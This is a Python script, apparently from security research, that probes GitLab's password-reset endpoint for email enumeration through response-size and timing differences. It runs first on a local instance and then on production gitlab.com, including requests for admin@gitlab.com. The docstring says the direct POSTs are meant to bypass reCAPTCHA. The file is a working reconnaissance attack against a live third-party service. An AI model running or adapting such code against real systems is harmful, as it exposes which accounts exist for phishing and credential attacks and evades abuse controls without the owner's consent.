"""
Email enumeration test v2 - handles reCAPTCHA by using API directly
"""
import time
import requests


def log(msg):
    print(f"[*] {msg}")


def test_via_api():
    """Test email enumeration via direct HTTP requests to avoid reCAPTCHA."""
    log("Testing email enumeration via direct API requests...")
    log("(Bypassing reCAPTCHA by using the API password reset endpoint)\n")

    # Test on local GDK first (no CAPTCHA)
    log("=== LOCAL GDK TEST ===")
    gdk = "http://127.0.0.1:3000"
    local_results = {}

    for label, email in [
        ("existing", "victim@wearehackerey.com"),
        ("existing2", "attacker@wearehackerey.com"),
        ("nonexist", "xyzfakeuser12345@nobody.com"),
        ("nonexist2", "abcfakeuser67890@nobody.com"),
        ("nonexist3", "qwerty99999@norealdomain.com"),
    ]:
        sizes = []
        times = []
        for _ in range(5):
            start = time.time()
            resp = requests.post(
                f"{gdk}/users/password",
                data={"user[email]": email},
                allow_redirects=False,
            )
            elapsed = time.time() - start
            sizes.append(len(resp.content))
            times.append(elapsed)
            time.sleep(0.2)

        avg_size = sum(sizes) / len(sizes)
        avg_time = sum(times) / len(times)
        local_results[label] = {"email": email, "avg_size": avg_size, "avg_time": avg_time, "sizes": sizes}
        log(f"  {label:12s} ({email:40s}): avg_size={avg_size:.0f}, avg_time={avg_time:.3f}s, sizes={sizes}")

    # Analyze local
    exist_sizes = [v["avg_size"] for k, v in local_results.items() if "nonexist" not in k]
    nonexist_sizes = [v["avg_size"] for k, v in local_results.items() if "nonexist" in k]
    exist_times = [v["avg_time"] for k, v in local_results.items() if "nonexist" not in k]
    nonexist_times = [v["avg_time"] for k, v in local_results.items() if "nonexist" in k]

    size_diff = abs(sum(exist_sizes)/len(exist_sizes) - sum(nonexist_sizes)/len(nonexist_sizes))
    time_diff = abs(sum(exist_times)/len(exist_times) - sum(nonexist_times)/len(nonexist_times))

    log(f"\n  Size difference: {size_diff:.0f} bytes")
    log(f"  Time difference: {time_diff:.3f}s")

    if size_diff > 2:
        log("  !!! LOCAL CONFIRMED: Response size differs based on email existence")
    if time_diff > 0.1:
        log("  !!! LOCAL TIMING: Response time differs based on email existence")

    # Test on production
    log("\n=== PRODUCTION TEST (gitlab.com) ===")
    prod = "https://gitlab.com"
    prod_results = {}

    log("  Testing via API endpoint (may be rate-limited)...")

    for label, email in [
        ("likely-exists", "admin@gitlab.com"),
        ("nonexist", "xyzfakeuser12345abc@nobodyhasthisemail99.com"),
        ("nonexist2", "anotherfakeuser67890@totallynotreal99.com"),
    ]:
        sizes = []
        times = []
        status_codes = []
        for i in range(3):
            start = time.time()
            try:
                resp = requests.post(
                    f"{prod}/users/password",
                    data={"user[email]": email},
                    headers={
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                        "Accept": "text/html,application/xhtml+xml",
                    },
                    allow_redirects=False,
                    timeout=15,
                )
                elapsed = time.time() - start
                sizes.append(len(resp.content))
                times.append(elapsed)
                status_codes.append(resp.status_code)
            except Exception as e:
                elapsed = time.time() - start
                times.append(elapsed)
                status_codes.append(f"ERR: {e}")
            time.sleep(2)  # Be respectful

        avg_size = sum(sizes) / len(sizes) if sizes else 0
        avg_time = sum(times) / len(times)
        prod_results[label] = {
            "email": email,
            "avg_size": avg_size,
            "avg_time": avg_time,
            "status_codes": status_codes,
            "sizes": sizes,
        }
        log(f"  {label:15s}: avg_size={avg_size:.0f}, avg_time={avg_time:.3f}s, codes={status_codes}, sizes={sizes}")

    # Production analysis
    if len(prod_results) >= 2:
        exist_r = [v for k, v in prod_results.items() if "nonexist" not in k]
        nonexist_r = [v for k, v in prod_results.items() if "nonexist" in k]

        if exist_r and nonexist_r:
            exist_avg = sum(r["avg_size"] for r in exist_r) / len(exist_r)
            nonexist_avg = sum(r["avg_size"] for r in nonexist_r) / len(nonexist_r)
            prod_diff = abs(exist_avg - nonexist_avg)

            exist_time = sum(r["avg_time"] for r in exist_r) / len(exist_r)
            nonexist_time = sum(r["avg_time"] for r in nonexist_r) / len(nonexist_r)
            time_diff = abs(exist_time - nonexist_time)

            log(f"\n  Production size difference: {prod_diff:.0f} bytes")
            log(f"  Production time difference: {time_diff:.3f}s")

            if prod_diff > 10:
                log("  !!! PRODUCTION VULNERABLE: Response size differs!")
            elif prod_diff > 0:
                log("  Minor size difference - may or may not be exploitable")
            else:
                log("  Sizes identical - not vulnerable via size")

            if time_diff > 0.3:
                log("  !!! PRODUCTION TIMING: Significant time difference!")

    log("\n=== DONE ===")


if __name__ == "__main__":
    test_via_api()
